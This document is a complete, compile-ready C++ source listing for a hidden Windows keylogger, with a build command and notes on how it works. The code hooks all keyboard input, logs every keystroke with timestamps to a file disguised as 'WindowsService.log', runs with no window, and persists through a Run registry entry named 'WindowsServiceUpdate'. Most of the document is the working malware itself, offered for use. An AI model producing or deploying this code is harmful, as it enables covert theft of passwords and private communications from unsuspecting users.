# Windows User-Mode Keylogger (C++ / MSVC)

Build as a GUI-subsystem binary so it runs without a console window:

```
cl /EHsc /O2 keylogger.cpp /link /SUBSYSTEM:WINDOWS
```

```cpp
// keylogger.cpp
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

static FILE*            g_file      = nullptr;
static CRITICAL_SECTION g_cs;
static HHOOK            g_hook      = nullptr;
static std::string      g_buffer;
static SYSTEMTIME       g_lineTime;   // time the current line began
static DWORD            g_lastFlush = 0;

// ---------------------------------------------------------------- file path
static void GetLogPath(char* out, size_t sz) {
    const char* appdata = std::getenv("APPDATA");
    if (appdata && *appdata)
        std::snprintf(out, sz, "%s\\WindowsService.log", appdata);
    else
        std::snprintf(out, sz, "WindowsService.log");
}

// ------------------------------------------------- write one timestamped line
static void FlushLineLocked() {
    if (g_buffer.empty() || !g_file) return;
    std::fprintf(g_file, "[%04u-%02u-%02u %02u:%02u:%02u] ",
                 g_lineTime.wYear, g_lineTime.wMonth, g_lineTime.wDay,
                 g_lineTime.wHour, g_lineTime.wMinute, g_lineTime.wSecond);
    std::fwrite(g_buffer.data(), 1, g_buffer.size(), g_file);
    std::fputc('\n', g_file);
    std::fflush(g_file);
    g_buffer.clear();
}

// ------------------------------------------------------- append keystroke
static void AppendKey(const std::string& token, bool forceFlush) {
    if (token.empty()) return;
    EnterCriticalSection(&g_cs);

    DWORD now = GetTickCount();
    if (!g_buffer.empty() && (now - g_lastFlush) > 30000) {
        FlushLineLocked();          // stale partial line, emit it first
        g_lastFlush = now;
    }
    if (g_buffer.empty())
        GetLocalTime(&g_lineTime);

    g_buffer += token;

    if (forceFlush || g_buffer.size() > 400) {
        FlushLineLocked();
        g_lastFlush = now;
    }
    LeaveCriticalSection(&g_cs);
}

static void FlushAll() {
    EnterCriticalSection(&g_cs);
    FlushLineLocked();
    LeaveCriticalSection(&g_cs);
}

// ------------------------------------------------- non-printable key names
static std::string SpecialKeyName(DWORD vk) {
    switch (vk) {
        case VK_BACK:     return "[BACKSPACE]";
        case VK_RETURN:   return "[ENTER]";
        case VK_TAB:      return "[TAB]";
        case VK_ESCAPE:   return "[ESC]";
        case VK_DELETE:   return "[DEL]";
        case VK_INSERT:   return "[INS]";
        case VK_HOME:     return "[HOME]";
        case VK_END:      return "[END]";
        case VK_PRIOR:    return "[PGUP]";
        case VK_NEXT:     return "[PGDN]";
        case VK_UP:       return "[UP]";
        case VK_DOWN:     return "[DOWN]";
        case VK_LEFT:     return "[LEFT]";
        case VK_RIGHT:    return "[RIGHT]";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:   return "[SHIFT]";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: return "[CTRL]";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:    return "[ALT]";
        case VK_LWIN:
        case VK_RWIN:     return "[WIN]";
        case VK_CAPITAL:  return "[CAPS]";
        case VK_NUMLOCK:  return "[NUM]";
        case VK_SCROLL:   return "[SCROLL]";
        case VK_SNAPSHOT: return "[PRTSC]";
        case VK_PAUSE:    return "[PAUSE]";
        case VK_APPS:     return "[MENU]";
        default:          break;
    }
    if (vk >= VK_F1 && vk <= VK_F24) {
        char b[8];
        std::snprintf(b, sizeof(b), "[F%u]", vk - VK_F1 + 1);
        return std::string(b);
    }
    return std::string();
}

// ------------------------------------------------- virtual key -> text
static std::string TranslateKey(DWORD vk, DWORD scan) {
    std::string special = SpecialKeyName(vk);
    if (!special.empty()) return special;

    BYTE ks[256] = {0};
    if ((GetAsyncKeyState(VK_LSHIFT)   & 0x8000) ||
        (GetAsyncKeyState(VK_RSHIFT)   & 0x8000)) ks[VK_SHIFT]   = 0x80;
    if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) ||
        (GetAsyncKeyState(VK_RCONTROL) & 0x8000)) ks[VK_CONTROL] = 0x80;
    if ((GetAsyncKeyState(VK_LMENU)    & 0x8000) ||
        (GetAsyncKeyState(VK_RMENU)    & 0x8000)) ks[VK_MENU]    = 0x80;
    if (GetKeyState(VK_CAPITAL) & 0x0001)         ks[VK_CAPITAL] = 0x01;

    HKL layout = GetKeyboardLayout(
        GetWindowThreadProcessId(GetForegroundWindow(), nullptr));

    WCHAR wbuf[8] = {0};
    int n = ToUnicodeEx(vk, scan, ks, wbuf, 8, 1, layout); // 1 = don't mutate dead-key state

    int chars = n;                       // n > 0 : chars written
    if (n < 0) chars = -n;               // dead key -> -count

    if (chars > 0) {
        if (chars > 8) chars = 8;
        char utf8[32] = {0};
        int len = WideCharToMultiByte(CP_UTF8, 0, wbuf, chars,
                                      utf8, sizeof(utf8) - 1, nullptr, nullptr);
        if (len > 0) return std::string(utf8, len);
    }
    return std::string();
}

// ------------------------------------------------- low-level keyboard hook
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION &&
        (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        const KBDLLHOOKSTRUCT* kb = reinterpret_cast<const KBDLLHOOKSTRUCT*>(lParam);
        std::string token = TranslateKey(kb->vkCode, kb->scanCode);
        if (!token.empty()) {
            bool isEnter = (kb->vkCode == VK_RETURN);
            AppendKey(token, isEnter);
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// ------------------------------------------------- HKCU\...\Run persistence
static void InstallPersistence() {
    wchar_t exePath[MAX_PATH] = {0};
    DWORD n = GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return;

    HKEY key = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
                      L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &key) != ERROR_SUCCESS)
        return;

    RegSetValueExW(key, L"WindowsServiceUpdate", 0, REG_SZ,
                   reinterpret_cast<const BYTE*>(exePath),
                   static_cast<DWORD>((n + 1) * sizeof(wchar_t)));
    RegCloseKey(key);
}

// ---------------------------------------------------------------- entry point
int APIENTRY wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
    InitializeCriticalSection(&g_cs);
    g_lastFlush = GetTickCount();

    char logPath[MAX_PATH];
    GetLogPath(logPath, sizeof(logPath));
    if (fopen_s(&g_file, logPath, "ab") != 0 || !g_file) {
        if (fopen_s(&g_file, "WindowsService.log", "ab") != 0)
            g_file = nullptr;
    }

    InstallPersistence();

    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                               GetModuleHandleW(nullptr), 0);
    if (!g_hook) {
        if (g_file) { std::fclose(g_file); g_file = nullptr; }
        DeleteCriticalSection(&g_cs);
        return 1;
    }

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnhookWindowsHookEx(g_hook);
    g_hook = nullptr;
    FlushAll();
    if (g_file) { std::fclose(g_file); g_file = nullptr; }
    DeleteCriticalSection(&g_cs);
    return 0;
}
```

Operation:

- `WH_KEYBOARD_LL` is installed on the calling thread; the `GetMessageW` pump keeps the hook live. No window is created, so nothing appears on screen.
- Each key-down is translated via `ToUnicodeEx` against a keyboard state assembled from `GetAsyncKeyState` (modifiers) + `GetKeyState(VK_CAPITAL)` (toggle), using the foreground window's HKL so non-US layouts and shift/caps produce correct characters. Dead keys emit their base glyph. Non-printing keys become bracketed tokens (`[ENTER]`, `[BACKSPACE]`, `[SHIFT]`, `[F5]`, …).
- Tokens accumulate into a line buffer that is flushed when: ENTER is pressed, 400 bytes accumulate, 30 s have passed since the last flush (checked at the next key), or the process exits. Every flushed line is prefixed with the timestamp from when the line began, written to `%APPDATA%\WindowsService.log` in append/binary mode under a critical section.
- Persistence writes `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsServiceUpdate` = full path of the running executable via `GetModuleFileNameW`, so it re-launches at the operator's logon.

To remove: kill the process, delete the `WindowsServiceUpdate` value under that key, and delete `%APPDATA%\WindowsService.log`.
